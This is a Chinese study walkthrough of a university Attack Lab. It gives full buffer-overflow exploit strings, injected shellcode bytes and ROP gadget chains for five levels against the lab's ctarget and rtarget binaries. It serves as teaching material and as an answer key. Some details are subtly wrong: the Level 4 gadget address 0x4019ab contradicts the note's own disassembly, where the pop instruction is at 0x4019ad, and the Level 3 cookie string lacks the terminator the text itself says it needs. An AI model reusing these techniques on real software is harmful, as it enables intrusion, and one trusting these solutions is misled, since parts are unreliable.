# Attack Lab 实验笔记

> **原始文件备份**：[attack_lab_backup.md](attack_lab_backup.md)

## 一、实验概述

### 1.1 目标与收获

本实验通过亲手实施五种攻击，理解缓冲区溢出的原理与防御。完成后你将能够：

| 能力 | 说明 |
|------|------|
| 攻击原理 | 理解如何通过缓冲区溢出劫持控制流 |
| 防御机制 | 理解栈保护、ASLR、NX 的作用及局限 |
| 底层调试 | 熟练使用 GDB + objdump 分析内存布局 |
| 汇编理解 | 掌握 x86-64 调用约定与栈帧结构 |

> ⚠️ **重要**：本实验仅用于理解系统安全原理，严禁将所学技术用于任何未经授权的系统。

---

### 1.2 实验文件说明

```
targetk.tar 解压后的核心文件：
├── ctarget     ← 攻击目标1：栈可执行，用于代码注入攻击（Level 1-3）
├── rtarget     ← 攻击目标2：开启 ASLR + NX，用于 ROP 攻击（Level 4-5）
├── cookie.txt  ← 你的唯一标识符（8位十六进制数，如 0x59b997fa）
├── farm.c      ← rtarget 的 gadget farm 源码，ROP 攻击的"工具箱"
└── hex2raw     ← 工具：将十六进制字节序列转换为原始字节流
```

> **注意**：务必在 Linux 系统上解压，避免权限位被 Windows/macOS 修改。

---

### 1.3 工具快速参考

**hex2raw**：将十六进制输入转为原始字节（攻击字符串必须经过这一步）

```bash
# 方式1：管道（最常用）
./hex2raw < exploit.txt | ./ctarget -q

# 方式2：先转文件，再输入
./hex2raw < exploit.txt > exploit.raw
./ctarget -q < exploit.raw

# -q 选项：跳过连接 CMU 服务器（本地测试必须加）
# 支持 /* 注释 */，可在十六进制串中添加说明
```

**objdump**：反汇编，查看函数地址、机器码、指令

```bash
objdump -d ctarget > ctarget.asm    # 反汇编整个程序
objdump -d example.o                # 查看编译后的机器码字节
```

**GDB**：动态调试，查看运行时寄存器和内存状态

```bash
gdb ./ctarget
(gdb) break getbuf          # 在 getbuf 函数入口断点
(gdb) run -q                # 运行（-q 跳过服务器连接）
(gdb) layout asm            # 显示汇编指令窗口
(gdb) layout regs           # 显示寄存器实时值
(gdb) info reg rsp          # 查看栈指针值
(gdb) x/8xg $rsp            # 以 8 字节格式查看栈内容
```

**生成注入代码的机器码**：

```bash
# 步骤：汇编源码 → 目标文件 → 提取字节
gcc -c inject.s              # 汇编成目标文件
objdump -d inject.o          # 查看对应的机器码字节
```

---

## 二、攻击的核心知识

在动手之前，必须先理解两个底层机制。这是所有攻击的理论基础。

### 2.1 x86-64 函数调用与返回地址

当函数 A 调用函数 B 时，`call` 指令做了两件事：
1. 将**返回地址**（`call` 的下一条指令地址）压入栈
2. 跳转到 B 的入口

当函数 B 执行 `ret` 时，从栈顶弹出这个地址，跳回 A 继续执行。

```
调用 getbuf 时的栈（从高地址到低地址）：

高地址 ┌─────────────────────────┐
       │  test 的栈帧（局部变量） │
       │  返回地址 = 0x401976    │  ← callq 压栈（getbuf 执行完应回到这里）
       │─────────────────────────│  ← %rsp 在 call 时指向此处
低地址 │  getbuf 的栈帧...        │
```

**攻击关键**：如果能修改栈上的**返回地址**，`ret` 就会跳到攻击者指定的位置。

### 2.2 缓冲区溢出原理

`getbuf` 函数使用不安全的 `Gets()` 读取输入：

```c
int getbuf() {
    char buf[BUFFER_SIZE];   // 固定大小的缓冲区（40字节）
    Gets(buf);               // 不检查长度！输入多少就写多少
    return 1;
}
```

`Gets()` 从低地址往高地址写数据。当输入超过缓冲区大小时，**多余的字节会覆盖栈上紧接其后的内容——包括返回地址**。

```
溢出前：                         溢出后（输入了 48 字节）：
高地址 ┌──────────────────┐      ┌──────────────────┐
       │ 返回地址 0x401976│      │ 0x4017c0（已被覆盖！）│
       │──────────────────│  →   │──────────────────│
       │  buf[39]         │      │  填充字节         │
       │  ...             │      │  ...             │
       │  buf[0]          │      │  注入的数据       │
低地址 └──────────────────┘      └──────────────────┘
                                  ↑ 写从这里开始，越过40字节后覆盖返回地址
```

### 2.3 x86-64 函数参数传递

x86-64 的前 6 个整数/指针参数依次通过寄存器传递：

| 参数位置 | 寄存器 | 说明 |
|---------|--------|------|
| 第 1 个 | `%rdi` | touch2/touch3 的参数就通过这里传 |
| 第 2 个 | `%rsi` | |
| 第 3 个 | `%rdx` | |
| 返回值  | `%rax` | |

这意味着：想让 `touch2(cookie)` 正确执行，必须在跳转前把 `cookie` 写入 `%rdi`。

---

## 三、代码注入攻击（CI）—— 针对 `ctarget`

`ctarget` 的栈是**可执行的**（没有 NX 保护），因此可以直接把代码注入到缓冲区并执行。

**统一攻击模板**：

```
┌────────────────────────────────────────────┐
│         构造利用字符串（exploit string）      │
│                                            │
│  [注入的机器码（可选）]  → 填充缓冲区        │
│  [填充字节 0x00 若干]   → 补齐到40字节      │
│  [目标地址（覆盖返回地址）] → 第41-48字节   │
│  [额外数据（可选）]                         │
└────────────────────────────────────────────┘
         ↓ hex2raw 转换 ↓
输入给 ctarget → 缓冲区溢出 → 控制流跳转
```

---

### 3.1 Level 1：覆盖返回地址（10分）

**目标**：让 `getbuf()` 返回时跳转到 `touch1`，而不是回到 `test`。

#### 思路

这是最简单的攻击：无需注入代码，只需**把返回地址替换为 `touch1` 的地址**。

```c
// 正常执行流程：getbuf() → 返回 → test() 继续
// 攻击后流程：getbuf() → ret → 跳转到 touch1()
void touch1() {
    vlevel = 1;
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

#### 第一步：确认关键地址

通过 `objdump -d ctarget` 获取：

```asm
00000000004017a8 <getbuf>:
  4017a8: 48 83 ec 28    sub $0x28,%rsp    # 分配 0x28 = 40 字节的缓冲区
  4017ac: 48 89 e7       mov %rsp,%rdi     # buf 起始地址 = %rsp
  4017af: e8 8c 02 00 00 callq 401a40 <Gets>
  4017b4: b8 01 00 00 00 mov $0x1,%eax
  4017b9: 48 83 c4 28    add $0x28,%rsp
  4017bd: c3             retq              # 从栈顶弹出返回地址执行

00000000004017c0 <touch1>:
  4017c0: ...                              # touch1 函数入口 = 0x4017c0
```

关键数据：
- **缓冲区大小**：40 字节（`sub $0x28,%rsp`，0x28 = 40）
- **`touch1` 地址**：`0x4017c0`

#### 第二步：理解栈布局

```
%rsp → [ buf[0]  ... buf[39] ]   ← 40 字节缓冲区（从低到高填充）
       [ 返回地址 = 0x401976 ]   ← 第 41-48 字节（需要覆盖这里）
```

输入超过 40 字节后，第 41-48 字节会覆盖返回地址。把这 8 字节写成 `touch1` 的地址，`ret` 就会跳去 `touch1`。

#### 第三步：构造输入

```
注意：x86-64 使用小端序——低字节存在低地址。
地址 0x4017c0 写入内存顺序：c0 17 40 00 00 00 00 00（低字节在前）
```

```txt
/* solution1.txt */
00 00 00 00 00 00 00 00   /* buf[0]  - buf[7]   填充 */
00 00 00 00 00 00 00 00   /* buf[8]  - buf[15]  填充 */
00 00 00 00 00 00 00 00   /* buf[16] - buf[23]  填充 */
00 00 00 00 00 00 00 00   /* buf[24] - buf[31]  填充 */
00 00 00 00 00 00 00 00   /* buf[32] - buf[39]  填充（共40字节）*/
c0 17 40 00 00 00 00 00   /* 返回地址 → touch1 (0x4017c0) 小端序 */
```

#### 第四步：执行与验证

```bash
./hex2raw < solution1.txt | ./ctarget -q
```

```
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: ...
```

---

### 3.2 Level 2：注入代码并传参（25分）

**目标**：跳转到 `touch2` 并传入正确的 `cookie` 值作为参数。

```c
void touch2(unsigned val) {
    vlevel = 2;
    if (val == cookie) {          // 必须 val == cookie 才算通过
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: ...\n"); fail(2);
    }
    exit(0);
}
```

#### 为什么 Level 1 的方法不够用？

Level 1 的方法直接跳到 `touch2` 是可以的，但 `touch2` 需要 `%rdi == cookie`，而**直接跳转无法控制寄存器的值**。

因此需要在跳转到 `touch2` 之前，先执行一小段代码来设置 `%rdi`。这段代码就注入在缓冲区里。

#### 攻击流程

```
getbuf 执行 ret
   ↓
弹出"注入代码地址"（已覆盖到返回地址处）
   ↓
执行注入代码：
   movq $cookie, %rdi    ← 设置 touch2 的参数
   pushq $touch2_addr    ← 把 touch2 地址压栈
   ret                   ← 弹出 touch2 地址，跳转
   ↓
touch2(cookie) 执行，验证通过
```

#### 第一步：确认关键地址

1. **缓冲区（buf）的起始地址**（注入代码存放在这里，也是跳转目标）

   ```bash
   gdb ./ctarget
   (gdb) break *0x4017ac          # 在 mov %rsp,%rdi 处断点
   (gdb) run -q
   (gdb) info reg rsp             # 此时 %rsp 就是 buf 的起始地址
   # 结果：rsp = 0x5561dc78
   ```

2. **touch2 的地址**（从 objdump 获取）：`0x4017ec`

#### 第二步：编写注入代码

```asm
# inject_l2.s
movq $0x59b997fa, %rdi   # 将 cookie 写入第一个参数寄存器
pushq $0x4017ec          # 把 touch2 的地址压栈
ret                      # 弹出 touch2 地址，跳转过去
```

```bash
gcc -c inject_l2.s
objdump -d inject_l2.o
```

反汇编结果（提取机器码）：

```asm
0: 48 c7 c7 fa 97 b9 59    movq $0x59b997fa, %rdi
7: 68 ec 17 40 00          pushq $0x4017ec
c: c3                      retq
```

机器码共 13 字节：`48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3`

#### 第三步：理解栈布局

```
注入代码执行时的栈（执行到 ret 之前）：
高地址 ┌──────────────────┐
       │  0x4017ec (touch2)│  ← pushq 压入的 touch2 地址
       │  ...（缓冲区中）  │
       │  注入代码字节     │  ← 代码在这里执行
       │  buf[0]          │  ← 缓冲区起始 = 0x5561dc78
低地址 └──────────────────┘
```

利用字符串的内存布局：

```
[注入代码13字节] [填充27字节 0x00] [注入代码地址 0x5561dc78]
    0~12字节          13~39字节           40~47字节（覆盖返回地址）
```

#### 第四步：构造输入

```txt
/* solution2.txt */
48 c7 c7 fa 97 b9 59 68   /* 注入代码前8字节 */
ec 17 40 00 c3 00 00 00   /* 注入代码后5字节 + 3字节填充 */
00 00 00 00 00 00 00 00   /* 填充 */
00 00 00 00 00 00 00 00   /* 填充 */
00 00 00 00 00 00 00 00   /* 填充（共40字节到此结束）*/
78 dc 61 55 00 00 00 00   /* 返回地址 → buf 起始 0x5561dc78 (小端序) */
```

#### 第五步：执行与验证

```bash
./hex2raw < solution2.txt | ./ctarget -q
```

```
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: ...
```

---

### 3.3 Level 3：注入代码并传字符串指针（25分）

**目标**：跳转到 `touch3` 并传入 cookie 的**十六进制字符串表示**的地址（如 `"59b997fa"`）。

```c
void touch3(char *sval) {
    vlevel = 3;
    if (hexmatch(cookie, sval)) {   // 对比字符串是否与 cookie 匹配
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else { ... }
}

int hexmatch(unsigned val, char *sval) {
    char cbuf[110];
    char *s = cbuf + random() % 100;    // 随机偏移！
    sprintf(s, "%.8x", val);            // 在栈上写 cookie 的字符串形式
    return strncmp(sval, s, 9) == 0;
}
```

#### Level 3 与 Level 2 的关键区别

Level 2 传的是整数（直接写入寄存器），Level 3 传的是**字符串指针**——需要在内存某处存放字符串 `"59b997fa"` 的 9 个字节（8位十六进制 + `\0`），然后把这块内存的地址传给 `%rdi`。

**关键问题：字符串放在哪里？**

不能放在 `getbuf` 的缓冲区（`buf`）里！原因是：

```
touch3 调用 hexmatch，hexmatch 在栈上分配 cbuf[110]，
分配的空间会向低地址扩展，覆盖掉 getbuf 已释放的缓冲区区域。
字符串会被 sprintf 的写入操作破坏，导致 strncmp 比较失败。
```

安全的位置：**`test` 函数的栈帧**（在 `getbuf` 返回地址的上方，不会被后续调用覆盖）：

```
高地址 ┌──────────────────────────────┐
       │ test 的栈（安全区域）         │ ← 存放 cookie 字符串
       │  返回地址（getbuf→test）       │ ← 0x401976（test 的栈顶）
       │──────────────────────────────│ ← 0x5561dca8（test 的 %rsp）
       │  getbuf 的缓冲区（40字节）     │ ← 注入代码放这里
低地址 └──────────────────────────────┘
```

#### 第一步：确认关键地址

通过 GDB 确认 `test` 函数的 `%rsp`（即 `getbuf` 返回地址的存放位置 + 8）：

```bash
gdb ./ctarget
(gdb) break test
(gdb) run -q
(gdb) info reg rsp
# 假设 test 的 rsp = 0x5561dca8
# 这就是 cookie 字符串将被放置的地址
```

- **cookie 字符串位置**：`0x5561dca8`（`test` 栈顶，高于缓冲区，安全）
- **touch3 地址**：`0x4018fa`（从 objdump 获取）

#### 第二步：准备 cookie 字符串的十六进制字节

`"59b997fa"` 的 ASCII 字节值：

```
字符:  5    9    b    9    9    7    f    a   \0
十六进制: 35   39   62   39   39   37   66   61   00
```

#### 第三步：编写注入代码

```asm
# inject_l3.s
movq $0x5561dca8, %rdi   # %rdi = cookie 字符串的地址（存放在 test 栈上）
pushq $0x4018fa           # 把 touch3 的地址压栈
ret                       # 跳转到 touch3
```

机器码（通过 `gcc -c` + `objdump -d` 获取）：

```asm
0: 48 c7 c7 a8 dc 61 55    movq $0x5561dca8, %rdi
7: 68 fa 18 40 00          pushq $0x4018fa
c: c3                      retq
```

#### 第四步：构造输入

```txt
/* solution3.txt */
48 c7 c7 a8 dc 61 55 68   /* 注入代码前8字节 */
fa 18 40 00 c3 00 00 00   /* 注入代码后5字节 + 3字节填充 */
00 00 00 00 00 00 00 00   /* 填充 */
00 00 00 00 00 00 00 00   /* 填充 */
00 00 00 00 00 00 00 00   /* 填充（共40字节）*/
78 dc 61 55 00 00 00 00   /* 返回地址 → buf 起始 0x5561dc78 (小端序) */
35 39 62 39 39 37 66 61   /* cookie 字符串 "59b997fa"（存放在 test 栈上）*/
```

> **字节说明**：最后 8 字节（`35 39 62 39 39 37 66 61`）会被写入 `test` 的栈帧区域（地址 `0x5561dca8`），这正是注入代码中 `%rdi` 指向的地址。

#### 第五步：执行与验证

```bash
./hex2raw < solution3.txt | ./ctarget -q
```

```
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: ...
```

---

## 四、面向返回编程攻击（ROP）—— 针对 `rtarget`

### 4.1 为什么代码注入失效了？

`rtarget` 开启了两项防御：

| 防御机制 | 作用 | 破解难度 |
|---------|------|---------|
| **ASLR**（地址空间随机化） | 每次运行栈的地址不同，无法预知注入代码的位置 | 高 |
| **NX/DEP**（栈不可执行） | 栈内存被标记为不可执行，跳转到注入代码直接段错误 | 高 |

这两项防御使得 Level 1-3 的方法完全失效。

### 4.2 ROP 的核心思想

**不注入新代码，而是复用程序已有的代码片段。**

在程序的可执行段（`.text`）中，存在大量以 `ret`（`0xc3`）结尾的代码片段，称为 **Gadget**。每个 Gadget 做一件小事（如 `pop %rax; ret`），通过在栈上依次排列多个 Gadget 的地址，`ret` 指令会一个接一个地"链式执行"这些 Gadget。

```
栈内容（从低地址到高地址）：
┌─────────────────────┐
│  gadget1 的地址      │  ← getbuf ret 后先跳这里
│  gadget2 的地址      │  ← gadget1 的 ret 跳这里
│  数据（可选）        │  ← 某个 gadget 的 popq 会取这里的值
│  gadget3 的地址      │
│  touch2 的地址       │  ← 最后一个 gadget 的 ret 跳这里
└─────────────────────┘

执行流程：
ret → 执行 gadget1（末尾 ret）→ 执行 gadget2（末尾 ret）→ ... → 到达 touch2
```

### 4.3 Gadget Farm 与"错位解析"

`farm.c` 中的函数被编译进 `rtarget`，这些函数及其字节序列中可能"隐藏"着有用的 Gadget。

**例子**（错位解析）：

```asm
/* setval_210 的反汇编结果 */
0000000000400f15 <setval_210>:
  400f15: c7 07 d4 48 89 c7    movl $0xc78948d4, (%rdi)
  400f1b: c3                   retq
```

从地址 `0x400f18` 开始解析（错位 3 字节）：

```asm
400f18: 48 89 c7    movq %rax, %rdi   ← 有用！
400f1b: c3          retq
```

这就是一个可以将 `%rax` 移动到 `%rdi` 的 Gadget，地址为 `0x400f18`。

> **获取 rtarget 的完整汇编**：`objdump -d rtarget > rtarget.asm`  
> 然后在文件中搜索 `48 89` / `58` / `c3` 等字节序列，寻找可用 Gadget。

---

### 4.4 Level 4：ROP 实现 touch2（35分）

**目标**：用 ROP 链完成与 Level 2 相同的任务——跳转到 `touch2` 并传入 `cookie`。

由于 ASLR，无法硬编码注入代码的地址；由于 NX，无法执行注入的代码。  
**解决方案**：用 Gadget 代替注入代码，实现相同的功能。

#### Level 2 注入代码的等价 ROP 分解

Level 2 的注入代码做了两件事：
1. `movq $cookie, %rdi`——但 `gadget farm` 中没有带立即数的 `movq %rdi` gadget
2. `ret → touch2`

替代思路：

```
cookie 先放到栈上 → pop 到某个寄存器（如 %rax）→ mov 到 %rdi → ret 到 touch2

Gadget 链：
  gadget1: popq %rax; ret   ← 从栈上弹出 cookie 到 %rax
  gadget2: movq %rax, %rdi; ret  ← 把 %rax 的值移到 %rdi
  → 执行 touch2(cookie)
```

#### 第一步：在 farm 中找 Gadget

**寻找 `popq %rax; ret`**（机器码：`58 c3`）：

在 `rtarget.asm` 中搜索 `58`（`pop %rax` 的机器码），找到：

```asm
00000000004019ab <getval_280>:
  4019ab: b8 29 58 90 c3    movl $0xc3905829, %eax
  4019b0: c3                retq
```

从 `0x4019ab + 2 = 0x4019ad` 开始读：`58 90 c3`

```asm
4019ad: 58    popq %rax
4019ae: 90    nop
4019af: c3    retq
```

✅ **gadget1 地址：`0x4019ab`**（原文件中可能不同，需自己确认）

**寻找 `movq %rax, %rdi; ret`**（机器码：`48 89 c7 c3`）：

```asm
00000000004019c5 <setval_426>:
  4019c5: c7 07 48 89 c7 90    movl $0x90c78948, (%rdi)
  4019cb: c3                   retq
```

从 `0x4019c5 + 2 = 0x4019c7` 开始读：`48 89 c7 90 c3`

```asm
4019c7: 48 89 c7    movq %rax, %rdi
4019ca: 90          nop
4019cb: c3          retq
```

✅ **gadget2 地址：`0x4019c7`**

#### 第二步：设计栈布局

```
高地址 ┌─────────────────────────────────────┐
       │  touch2 地址 = 0x4017ec             │  ← gadget2 ret 后跳这里
       │  gadget2 地址 = 0x4019c7            │  ← gadget1 ret 后跳这里
       │  cookie   = 0x59b997fa              │  ← gadget1 pop 取这里的值 → %rax
       │  gadget1 地址 = 0x4019ab            │  ← getbuf ret 后先跳这里
       │  填充 0x00 × 40                     │  ← 覆盖缓冲区（40字节）
低地址 └─────────────────────────────────────┘
```

#### 第三步：构造输入

```txt
/* rsolution1.txt */
00 00 00 00 00 00 00 00   /* 填充（共40字节）*/
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00   /* gadget1: popq %rax; ret (0x4019ab) */
fa 97 b9 59 00 00 00 00   /* cookie 值，gadget1 会 pop 到 %rax */
c7 19 40 00 00 00 00 00   /* gadget2: movq %rax,%rdi; ret (0x4019c7) */
ec 17 40 00 00 00 00 00   /* touch2 地址 (0x4017ec) */
```

#### 第四步：执行与验证

```bash
./hex2raw < rsolution1.txt | ./rtarget -q
```

```
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: ...
```

---

### 4.5 Level 5：ROP 实现 touch3（5分，高难度）

**目标**：用 ROP 链完成与 Level 3 相同的任务——跳转到 `touch3` 并传入 cookie 字符串的地址。

#### 为什么 Level 4 的方法不够用？

Level 3 的核心挑战是**计算字符串地址**。Level 4 的 ROP 能传常量（`pop` 一个固定值），但字符串地址依赖于栈的位置，而 ASLR 使栈地址每次运行都不同。

**解决方案**：利用 `%rsp` 的值（当前栈指针，可以读到）加上一个固定偏移，动态计算字符串的地址。

#### 攻击思路

```
1. 读取当前 %rsp 的值 → 存入某寄存器（如 %rax）
2. 把偏移量 pop 到另一个寄存器（如 %rdi 或 %rsi）
3. 执行 %rax + 偏移 → 得到字符串地址 → 存入 %rdi
4. ret 到 touch3
5. 字符串本身附加在栈的末尾
```

#### 第一步：寻找所需 Gadget

需要以下功能的 Gadget（在 `start_farm` 到 `end_farm` 之间搜索）：

| 功能 | 指令 | 机器码 |
|------|------|--------|
| 读取 `%rsp` | `movq %rsp, %rax` | `48 89 e0` |
| 传给第一个参数 | `movq %rax, %rdi` | `48 89 c7` |
| 加法 | `lea (%rdi,%rsi,1), %rax` | `48 8d 04 37` |
| pop 偏移量 | `popq %rsi` | `5e` 或通过 `movl` 间接实现 |

> **提示**：由于 `movl` 会清零寄存器的高 32 位，可以借助 `movl %eax, %edx` 等指令通过低 32 位寄存器传值。官方解法使用了 8 个 Gadget。

#### 第二步：确定字符串偏移量

字符串 `"59b997fa"` 需要附加在 ROP 链末尾。设 ROP 链共有 N 个 Gadget（每个 8 字节），字符串在整个输入中的位置为固定的，与 `%rsp`（getbuf 溢出后指向 gadget1 的位置）的偏移也是固定的，可以计算：

```
偏移 = (ROP 链中 gadget 数量 × 8) 字节
```

#### 第三步：构造输入（示意，需根据自己的 rtarget 调整地址）

```txt
/* rsolution2.txt — 示意结构 */
00 × 40字节                      /* 填充缓冲区 */
[movq %rsp, %rax 的 gadget 地址]  /* 读 rsp 到 rax */
[movq %rax, %rdi 的 gadget 地址]  /* rdi = rsp（字符串地址的基准） */
[popq %rsi 的 gadget 地址]        /* 从栈上 pop 偏移量 */
[偏移量]                           /* 例如 0x48 = 72 */
[lea (%rdi,%rsi,1),%rax 的地址]   /* rax = rdi + rsi */
[movq %rax, %rdi 的 gadget 地址]  /* rdi = 字符串地址 */
[touch3 的地址]                    /* 跳转到 touch3 */
35 39 62 39 39 37 66 61 00        /* "59b997fa\0" cookie 字符串 */
```

#### 验证

```bash
./hex2raw < rsolution2.txt | ./rtarget -q
```

```
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: ...
```

---

## 五、总结

### 五种攻击方法对比

| Level | 目标 | 核心技术 | 关键步骤 |
|-------|------|---------|---------|
| Level 1 | 跳转到 touch1 | 覆盖返回地址 | 40字节填充 + touch1 地址 |
| Level 2 | 带参数跳转 touch2 | 注入代码 + 设置寄存器 | 注入代码写入 `%rdi`，ret 到 touch2 |
| Level 3 | 传字符串指针 | 注入代码 + 安全存储字符串 | 字符串放在 test 栈帧，传地址给 `%rdi` |
| Level 4 | ROP 复现 Level2 | gadget 链 + pop/mov | popq gadget → movq gadget → touch2 |
| Level 5 | ROP 复现 Level3 | gadget 链 + 动态地址计算 | 读 `%rsp` + 偏移计算 → 字符串地址 |

### 防御机制与攻击对应关系

```
代码注入（CI）：
  漏洞：Gets() 无边界检查 + 栈可执行 + 无 ASLR
  防御：NX（栈不可执行）+ ASLR（随机化）

ROP 攻击：
  漏洞：即使有 NX + ASLR，仍存在 gadget 可利用
  防御：CFI（控制流完整性检查）+ Stack Canary
```

### 常用调试命令速查

```bash
# 查看函数地址
objdump -d ctarget | grep -A5 '<touch1>'

# 确认缓冲区大小（看 sub $XX,%rsp）
objdump -d ctarget | grep -A5 '<getbuf>'

# 运行时查看栈指针
gdb ./ctarget -q
(gdb) break getbuf
(gdb) run -q
(gdb) stepi                    # 执行一条指令
(gdb) info reg rsp             # 查看 rsp
(gdb) x/20xg $rsp              # 查看栈内容（20个8字节块）
```
